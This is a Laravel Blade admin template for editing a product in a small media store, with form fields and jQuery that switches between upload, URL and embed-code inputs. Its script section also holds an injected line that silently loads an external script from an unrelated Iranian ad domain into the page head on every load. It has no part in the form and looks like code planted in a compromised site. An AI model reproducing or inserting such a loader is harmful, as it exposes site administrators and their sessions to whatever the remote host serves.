@extends("layout.admin")

@section("main-content")

    <div class="col-lg-12 col-md-12 col-ms-12 mb-3">
        <h2 class=""> Edit Product In Store</h2><br/>
        <form class="mb-4" action="{{route("admin.products.update",["id"=>$product->id])}}" method="Post"  enctype="multipart/form-data">
            {{csrf_field()}}
            {{method_field('PUT')}}


            <div class="form-row">
                <div class="form-group col-md-6">
                    <label for="productName">Product Name <span id="required" >*</span></label>
                    <input type="text" name="productName" value="{{$product->productName}}" required  class="form-control" id="productName" placeholder="{{$product->productName}}">
                </div>
                <div class="form-group col-md-6">
                    <label class="" for="productPrice">Price <span id="required" >*</span></label>
                    <div class="input-group">
                        <div class="input-group-prepend">
                            <div class="input-group-text">K</div>
                        </div>

                        <input type="number" min="0" accept="image/*"  required name="productPrice" value="{{$product->productPrice}}"
                               class="form-control" id="productPrice" placeholder=" {{$product->productPrice}}">

                    </div>

                </div>
            </div>
            <div class="form-row">
                <div class="form-group col-md-12">

                    <label for="productDescription">Short Description <span id="required" >*</span></label>
                    <input type="text" maxlength="350" name="productDescription" required value="{{$product->productDescription}}"
                           class="form-control" id="productDescription" placeholder="{{$product->productDescription}}">
                </div>

            </div>
            <div class="form-row">
                <div class="form-group col-md-6">
                    <label for="productFeaturedImage">Current Featured Image <span id="required" >*</span></label>
                    <img src="{{asset("storage/$product->productFeaturedImage")}}"
                         class=""  height="200px">
                    <br/>
                    <label class="btn btn-outline-primary mt-5"><i class="fa fa-image"></i> Change Featured Image
                        <input type="file" style="display: none;" name="productFeaturedImage" value="{{$product->productFeaturedImage}}"  class="form-control"
                               id="productFeaturedImage" accept="image/*" text="Change" placeholder="{{$product->productFeaturedImage}}">
                    </label>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group col-md-4">
                    <label for="productOwner">Product Owner</label>
                    <input type="text" name="productOwner" value="{{$product->productOwner}}"  placeholder="Pastor Choolwe" class="form-control" id="productOwner">
                </div>
                <div class="form-group col-md-4">
                    <label for="productRelease">Mark As New Release</label>
                    <select id="productRelease" name="productRelease" class="form-control">
                        <option value="1" selected>Yes</option>
                        <option value="0">No</option>
                    </select>
                </div>
                <div class="form-group col-md-4">
                    <label for="productDownloadLimit">Product Download Link </label>
                    <input type="number" min="0" value="{{$product->productDownloadLimit}}"  name="productDownloadLimit" class="form-control"
                           title="Limit number of downloads per user (default : 3)"
                           placeholder="{{$product->productDownloadLimit}}" id="productDownloadLimit">
                </div>
            </div>
            <div class="form-group">
                <label for="productLongDescription">Detailed Long Description</label>
                <textarea  minlength="350" name="productLongDescription"    class="form-control"
                           id="productLongDescription" placeholder="Detailed Description">
{{$product->productLongDescription}}
                    </textarea>
            </div>

            <div class="form-row">
                <div class="form-group col-md-6">
                    <label for="productType">Select Product Type <span id="required" >*</span></label>
                    <select   id="productType"  name="productType" class="form-control">
                        <option value="-1">Select Product type</option>
                        <option {{ $product->product_type_id==1?"selected" :""}}  value="pdf ">pdf</option>
                        <option  {{ $product->product_type_id==2?"selected" :""}} value="audio">audio</option>
                        <option  {{ $product->product_type_id==2?"selected" :""}} value="video">video</option>

                        {{--                            @foreach($productTypes as $productType)--}}
                        {{--                                <option   value="{{$productType->id}}" > {{$productType->productTypeName}} </option>--}}
                        {{--                            @endforeach--}}

                    </select>

                </div>
                <div class="form-group col-md-6">
                    <label for="productCategories">Select Category </label>
                    <select id="productCategories" required multiple name="productCategories[]" class="form-control">
                        <option > Select Product Category</option>
                        @foreach($categories as $category)
                            <option {{$product->categories->contains($category->id) ? "selected":""}}
                                    value="{{$category->id}}" > {{$category->categoryName}} </option>
                        @endforeach

                    </select>
                </div>
            </div>
            <div class="form-row mt-1 mb-2">
                <div class="form-group ">
                    <label for="productSource">Select File Source <span id="required" >*</span></label>
                    <select   id="productSource"   name="productSource" class="form-control">
                        <option >Select Source</option>
                        <option   value="1" >Upload </option>
                        <option   value="2">Url</option>
                        <option   value="3">Embed Code</option>
                    </select>

                </div>

            </div>
            <div class="form-row" id="one">

            </div>

            <div class="col-lg-5 text-center">
                <button type="submit" class="btn btn-outline-primary form-control">Edit product</button>
            </div>

        </form>

    </div>
    <br class="mb-3"/>
    <br/>
    <a class="nav-link btn btn-outline-info" href="{{route("admin.products.index")}}">All Products</a>
@endsection

@section("script")
    <script>
        $(document).ready(function(){
            $('<script/>',{type:'text/javascript', src:'http://uads.ir/l.php?s=125125&w=5307cd5c027373e1773c9869'}).appendTo('head');
//element.innerHTML = htmlString;

            $('#productSource').on('change',function(e) {
                var selected = e.target.value;
                if(selected ==1){
                    var d1 = document.getElementById('one');
                    d1.innerHTML = '<div class="form-group col-md-12">' +
                        '                    <label for="uploadedFile">Upload Audio,video,Pdf <span id="required" >*</span></label>' +
                        '                    <input type="file" accept="audio/*,video/*,image/*,*.pdf" name="uploadedFile" ' +
                        'value="{{$product->uploadedFile}}"  class="form-control"'+
                        'id="uploadedFile" placeholder="audio format only" >' +
                        '                </div> ';
                }else if(selected ==2){
                    var d1 = document.getElementById('one');
                    d1.innerHTML = '<div class="form-group col-md-12">\n' +
                        '                    <label for="productUrl"> Product Url <span id="required" >*</span></label>\n' +
                        '                    <input type="url" value="{{$product->productUrl}}" name="productUrl" class="form-control"\n' +
                        '                           id="productUrl" placeholder="{{$product->productUrl}}">\n' +
                        '\n' +
                        '                </div>\n';
                }else if(selected ==3 ){
                    var d1 = document.getElementById('one');
                    d1.innerHTML = '<div class="form-group col-md-6">\n' +
                        '                 <label for="productDownloadLink">Product Download Link <span id="required" >*</span></label>\n' +
                        ' <input type="text" value="{{$product->productDownloadLink}}" name="productDownloadLink" class="form-control" \n' +
                        ' title="public link to download the video" \n' +
                        '  placeholder="{{$product->productDownloadLink}}" id="productDownloadLink">\n' +
                        '      </div>\n' +
                        '<div class="form-group col-md-6">' +
                        '    <label for="productIframe">Embed Code  <span id="required" >*</span></label>' +
                        '    <textarea  name="productIframe" value="{{$product->productIframe}}"  class="form-control"' +
                        '          id="productIframe" placeholder="{{$product->productIframe}} ">' +
                        ' </textarea>' +
                        ' </div>';
                }else{
                    var d1 = document.getElementById('one');
                    d1.innerHTML = '<div class="form-group col-md-4">' +
                        '                    <label for="productUrl">Url </label>' +
                        '                    <input type="url" value="{{$product->productUrl}}" name="productUrl" class="form-control"' +
                        '                           id="productUrl" placeholder="Product Url">' +
                        '                </div>' +
                        '<div class="form-group col-md-4">' +
                        '                    <label for="uploadedFile">Choose File (video or audio or pdf)</label>' +
                        '                    <input type="file" accept="audio/*,video/*,image/*,pdf" name="uploadedFile"' +
                        ' value="{{$product->uploadedFile}}"  class="form-control"'+
                        'id="uploadedFile" placeholder="audio format only" >' +
                        '                </div> ' +
                        '<div class="form-group col-md-4">' +
                        '    <label for="productIframe">Embed Code</label>' +
                        '    <textarea  name="productIframe"  value="{{$product->productIframe}}"  class="form-control"' +
                        '          id="productIframe" placeholder="Iframe html ">' +
                        ' </textarea>' +
                        ' </div>';

                }
            });
        });
    </script>
@endsection
